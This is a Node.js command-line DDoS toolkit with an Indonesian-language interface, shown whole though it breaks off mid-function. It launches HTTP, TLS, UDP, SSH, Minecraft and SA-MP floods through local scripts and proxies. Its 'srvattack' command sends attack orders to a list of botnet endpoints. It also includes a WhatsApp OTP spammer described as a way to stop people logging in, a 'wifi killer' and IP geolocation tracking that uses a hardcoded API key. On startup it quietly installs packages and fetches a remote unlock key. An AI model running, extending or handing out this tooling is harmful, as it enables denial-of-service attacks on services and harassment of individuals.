#!/usr/bin/env node
const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.8'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear();
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mTAYO\x1b[0m
pembuat: tayo/irfa
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mbantuan\x1b[0m For Available Command 
`)}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| \x1b[1m\x1b[36m▓\x1b[0m░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| \x1b[1m\x1b[36m▓▓\x1b[0m░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/RIFFXD/version/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| \x1b[1m\x1b[36m▓▓▓\x1b[0m░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| \x1b[1m\x1b[36m▓▓▓▓▓▓\x1b[0m░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/RIFFXD/security.txt/refs/heads/main/security.txt');
    const password = await secretBangetJir.text();
    await console.log(`masukan key nya ya sayang`)
    permen.question('[ \x1b[1m\x1b[32mmasukan key nya ya sayang\x1b[0m ]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`key berhasil selamat menjalankan🥱😵‍💫`)
        console.log(`|| \x1b[1m\x1b[36m▓▓▓▓▓▓▓\x1b[0m░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| \x1b[1m\x1b[36m▓▓▓▓▓▓▓▓▓▓\x1b[0m || 100%`)
        await sleep(700)
        console.clear()
        console.log(`[ \x1b[1m\x1b[32mselamat data di tools ini  ${version}\x1b[0m]`)
        await sleep(1000)
		    await banner()
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
Sedang Otw Membunuh Wifi
Exit to Stop
`);
permen.question('[\x1b[1m\x1b[31mXHUNTER Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`Kill Wifi Selesai`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <duration> <methods>\nsrvattack https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    let result;

    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });

        console.clear();
        console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa 
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mtayo\x1b[0m
Portable DDoS Tools By TAYO
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
      Attack Details
Status   : [ \x1b[1m\x1b[32mAttack Sent Successfully All Server\x1b[0m ]
Target   : [ \x1b[1m\x1b[36m${target}\x1b[0m ]
Port     : [ \x1b[1m\x1b[36m443\x1b[0m ]
Duration : [ \x1b[1m\x1b[36m${duration}\x1b[0m ]
Methods  : [ \x1b[1m\x1b[36m${methods}\x1b[0m ]
      Target Details
ISP      : [ \x1b[1m\x1b[36m${result.isp}\x1b[0m ]
Ip       : [ \x1b[1m\x1b[36m${result.query}\x1b[0m ]
AS       : [ \x1b[1m\x1b[36m${result.as}\x1b[0m ]
note     : jangan spam sayangi lah sc ini
Please After Attack Type [\x1b[1m\x1b[35mcls\x1b[0m] To Return To The Home
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    // Garis bawah tabel
    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}


async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa⠁
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mirfa\x1b[0m
pembuat: irfa x tayo 
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32m - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}\x1b[0m
 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal 
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mtayo\x1b[0m
pembuat: irfa x tayo
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
      Attack Details
Status   : [ \x1b[1m\x1b[32mAttack Sent Successfully All Server\x1b[0m ]
Target   : [ \x1b[1m\x1b[36m${target}\x1b[0m ]
Port     : [ \x1b[1m\x1b[36m443\x1b[0m ]
Duration : [ \x1b[1m\x1b[36m${duration}\x1b[0m ]
Methods  : [ \x1b[1m\x1b[36m${methods}\x1b[0m ]
      Target Details
ISP      : [ \x1b[1m\x1b[36m${result.isp}\x1b[0m ]
Ip       : [ \x1b[1m\x1b[36m${result.query}\x1b[0m ]
AS       : [ \x1b[1m\x1b[36m${result.as}\x1b[0m ]

Please After Attack Type [\x1b[1m\x1b[35mcls\x1b[0m] To Return To The Home
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'ninja') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 500 500`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 500 500 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${duration} 500 proxy.txt 500 ${target}`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
          } else if (methods === 'sky') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
          } else if (methods === 'h2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 50 500 proxy.txt`)
          } else if (methods === 'xyn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
          } else if (methods === 'http') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
        } else if (methods === 'glory') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500 proxy.txt`)
          sigma()
        } else if (methods === 'quantum') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 4 proxy.txt`)
          sigma()
          } else if (methods === 'bomb') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 500 500`)
          sigma()
          } else if (methods === 'cf') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mirfa\x1b[0m
pembuat: irfa x tayo
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32mTarget   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}\x1b[0m

 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal 
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 443 root ${duration}`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: kill-otp <target> <duration>
kill-otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mtayo\x1b[0m
Pembuat: irfa x tayo
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32mTarget   : ${target}
Duration : ${duration}\x1b[0m

Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login
 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXTemp`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mRiffXD\x1b[0m
Pembuat: tayo
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32mTarget   : ${target}
Duration : ${duration}
Methods  : UDP Raw
note     : jangan spam sayangi lah sc ini

 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mcbot(args) {
  if (args.length < 3) {
    console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mtayo\x1b[0m
Pembuat: tayo x irfa 
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32mTarget   : ${target}
Duration : ${duration}
Methods  : Minecraft Flooder
note     : jangan spam sayangi lah sc ini

 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal `)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}

const metode = path.join(__dirname, `/lib/cache/StarsXMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mirfa\x1b[0m
Pembuat: tayo x irfa 
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
\x1b[1m\x1b[32mTarget   : ${target}
Duration : ${duration}
Methods  : SAMP Flooder
Creator  : RiffXD\x1b[0m

 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal `)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/StarsXSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
████████╗ █████╗  ╚██╗   ╚██╗ ██████╗
╚══██╔══╝██╔══██|  ╚██╗  ██╔╝██╔═══██╗
   ██║   ███████    ╚████╔╝  ██║   ██║
   ██║   ██╔══██║     ██╔╝   ██║   ██║
   ██║   ██║  ██║     ██|    ╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝     ╚═╝     ╚═════╝
                              tools by: irfa
     
Versi: \x1b[1m\x1b[36m${version}\x1b[0m
Premium: \x1b[1m\x1b[32mTrue\x1b[0m
Owner: \x1b[1m\x1b[32mtayo x irfa\x1b[0m
pembuat:tayo x irfa
\x1b[1m\x1b[32m_____________________________________________________________\x1b[0m
Type \x1b[1m\x1b[35mhelp\x1b[0m For Available Command 
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function chat_ai() {
permen.question('[\x1b[1m\x1b[31m Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://api.agatz.xyz/api/ragbot?message=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ Ragbot ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `


Thx To:
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
MY FRIEND
Tools By XHUNTER
`
permen.question('\x1b[1m\x1b[31m\x1b[47mroot-tayo\x1b[0m \x1b[1m\x1b[31m\x1b[47m➤\x1b[0m ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'bantuan') {
    console.log(`
• cekmethodes  │ show list of available methods
• srvmenu      │ show list of available botnet
• track-ip     │ track ip address with info
• subdo-finder │ find all subdomain from domain
• kill-wifi    │ kill your wifi (termux/linux/windows only)
• kill-ssh     │ kill VPS Access 
• kill-otp     │ kill WhatsApp OTP Verification
• kill-ping    │ sending death pinger
• samp         │ S.A.M.P Flooder
• mc-flood     │ Minecraft Bot Flooder
• attack       │ launch ddos attack
• udp-raw      │ launch udp flood attack
• kill-do      │ digital ocean killer
• ongoing      │ show ongoing attack
• news         │ show latest permenmd news
• ai           │ Chat With Ai
• credits      │ show creator of these tools
• cls          │ clear terminal
mohon untuk jangan di jual ini gratisan by irfa 
`);
    sigma();
  } else if (command === 'cekmethodes') {
    console.log(`

 NAME       │ DESCRIPTION                                   │ DURATION 
────────────┼───────────────────────────────────────────────┼──────────
 flood      │ Layer7 [BASIC] Attack Url [Secure Connection] │  300
 tls        │ Layer7 [BASIC] Attack Url [Best Methods]      │  300
 strike     │ Layer7 [BASIC] Attack Url [Secure Connection] │  300
 kill       │ Layer7 [BASIC] Attack Url [Secure Connection] │  300
 bypass     │ Layer7 [BASIC] Attack Url [Secure Connection] │  300
 destroy    │ Layer7 [BASIC] Attack Url [Best Methods]      │  300
 thunder    │ Layer7 [BASIC] Attack Url [Best Methods]      │  300
 quantum    │ Layer7 [BASIC Attack Url [Best Methods]       │  300
 sky        │ Layer7 [BASIC] Attack Url [Secure Connection  │  300
 glory      │  updet bos ku 🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶🥶│  300
 bomb       │ Layer7 [VIP] Attack Url [Best Methods]        │  300
 ninja      │ Layer7 [VIP] Attack Url [Bypasser Methods]    │  300
 rape       │ Layer7 [VIP] Attack Url [Best Methods]        │  300
 xyn        │ Layer7 [VIP] Attack Url [Best Methods]        │  300
 http       │ Layer7 [VIP] Attack Url [Best Methods]        │  300
 h2         │ Layer7 [VIP] Attack Url [Best Methods]       │  300
 cf         │ Layer7 [VIP] Attack Url [Best Bypasser]       │  300
         lebih baik jangan spam jagalah HP anda dan penel 😵‍💫😶‍🌫
strike     | updett bos ku ☠️☠️☠️☠️☠️☠️
h2        | updet bos ku 🥶 kusus sch

`);
    sigma();
        } else if (command === 'srvmenu') {
    console.log(`
┌────────────[ \x1b[1m\x1b[3m\x1b[33mServer Command\x1b[0m  ]────────────┐
│srvattack    Attack with Server            │
│testsrv      Checking Your Server          │
│addsrv       Add Server                    │
└───────────────────────────────────────────┘
             \x1b[1m\x1b[3m\x1b[33mMethod With Server\x1b[0m
• Https (VIP)    || - Browser
• Strike         || - Vsebypass/Vseflood
• Bypass         || - Quantum
• Tls            || - Rape
• Ninja          || - Pidoras/pidoras2
• Mix            || - Storm
• Raw            || - Glory (VIP)
• Cibi           || - Gloryv(1,2,3)
         tembahan  methods
•bh              || - updet 
•strike           || - update dengan lebih gocor
•panel           || update hanya ddos panel
•glory            || fitur paling gacor 🤪🤪
•sch              || kusus situs sch 
•overload        || kusus buat loadin
Note : jangan berharap tinggi seperti angkasa karna free jika tembus 1 juta req bersukurlah

       ingat ini c2 api oky 😵‍💫😵‍💫
`);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
